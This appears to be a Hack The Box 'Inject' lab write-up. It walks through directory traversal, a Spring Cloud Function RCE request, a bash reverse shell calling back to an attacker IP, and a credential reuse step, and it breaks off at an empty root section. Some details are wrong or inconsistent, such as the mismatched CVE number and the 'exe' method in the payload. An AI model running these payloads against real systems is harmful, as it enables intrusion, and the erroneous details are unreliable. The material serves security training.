# [HTB] Inject - Penetration Testing Report

# Executive Summary
* **Target OS:** Linux
* **Difficulty:** Easy
* **Target IP:** 10.129.228.213
* **Vectors Used:** Directory Traversal (LFI) & Spring Cloud Function RCE (CVE-2022-22963) & Ansible Automation Abuse

---

# 1. Reconnaissance

Port scan has been done via nmap against target machine.
```bash
nmap -sV -sC 10.129.228.213
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 05:24 -0400
Nmap scan report for 10.129.228.213
Host is up (1.0s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OPENSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.ort/submit/
Nmap done: 1 IP address (1 host up) scanned in 36.33 seconds
```

from the result of scan above, there are three opened ports, which are potentially vulnerable for this system.
Detailed information are shown below:
|port|status|service|
|:---|:---|:---|
|22|open|SSH(OpenSSH 8.2p1|
|8080|open|nagios-nsca|
<br>

---

# 2. Vulnerability Assessment

## BurpSuite

Performing web app enumeration using BurpSuite, following request was intercepted.
<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/4c7eabac-0ac5-4277-a6fc-1dc42846c075" />

<br>

Forwarding the following request, following GET request was received.
<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/ef052178-8268-438a-9b39-9960510279c2" />

---

# 3. Exploitation

## 1. Directory Traversal

Sending the `GET request` to repeater, parameter named `img` was revealed directly, which could cause `directory traversal attack` in the victim's viewpoint. With the knowledge, attack was performed by putting `../../../../../../etc/passwd` to read `/etc/passwd` file in the internal server to revealed parameter, which caused following result shown in `response` section.

<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/0b1173f3-4d7c-436b-ba82-8c382f141474" />

<br>

Based on the shown result above, attack was successful. With the information attacker could read file through parameter named `img`, further information gathering was performed.

<br>

Checking `/var/www` directory, which usually contains the configuration information about web application, directory named `WebApp` was discovered. Looking into the direcotry, file name `pom.xml` was fonud. Gathering information about `.xml` extension, it is discovered that it usually contains detailed web application information, including version and running service for maintenance. Following information was discovered.

<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/38b8f3df-2fda-4c07-9a33-03f7f7c613db" />

<br>

## 2. CVE-2022-22693
Researching for the vulnerable service among revealed information, Springboot framework version 3.2.2 was vulnerable for RCE. Using the contained function named `functionRouter` under the framework, following is the crafted payload.
```bash
POST /functionRouter HTTP/1.1
Host: 10.129.228.213:8080
.
.
.
Content-Length: 11
spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exe("<cmd>")

img=rev.png
```
<br>

Sending random file to the target system via `curl` was successful.
<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/7df4b68d-601d-42c2-a8f7-c939ca2e78a4" />

<br>

## 3. Reverse Shell
Confirming the GET request from the target system, crafting reverse shell executable and trigger from target machine for gaining initial access was possible. Here are the processes of gaining initial access.

* **1. Crafting Bash Shell Script**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.155/4444 0>&1
```

* **2. Send Crafted Script to the Target Internal Server**

For sending the crafted script, initiating python server listener on the attacker's machine was performed. 
```bash
python3 -m http.server
```

<br>

Confirming the port 8000 was opened for sending file to victim's internal server, the malicious script was sent to the victim's `/tmp` directory.
<img width="500" height="550" alt="image" src="https://github.com/user-attachments/assets/37639adf-77fa-49a9-a12b-d2b7960ec307" />

<br>

Sending the above request via `repeater`, it was confirmed the payload was saved under `/tmp/rev.sh`. 
<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/cd69cc6b-0593-4123-a22b-c6fe63ab691d" />


* **3. Trigger the Payload to Initiate Remote Access to Target System**
Starting `netcat listner` for receiving reverse shell connection on port 4444 based on crafted script.
```bash
nc -lvnp 4444
```

<br>

The script was triggered via sending following request to the victim's system.
<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/258e66d0-37bb-44b3-a194-12d3784c2e5a" />

Finally, shell was triggered and sent to attacker's listening port, access as user `frank`'s privilege was successful.
<img width="550" height="125" alt="image" src="https://github.com/user-attachments/assets/2da97dd8-9813-4e83-afac-e82e7f01704e" />

---

# 4. Privilege Escalation

## 1. Shell as Phil
Checking the home directory of user `frank`, directory name `.m2` was found. Enumerating the contents of directory, another .xml file was found, which was containing the password of username `phil`.
<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/32fcf4e2-c8a5-4df8-86f0-10ff1b772b70" />

<br> 

Gaining access as username `phil` was successful using the found credential.
```bash
su phil
Password: DocPhillovestoInject123
phil@inject:~$ 
```

## 2. Shell as Root








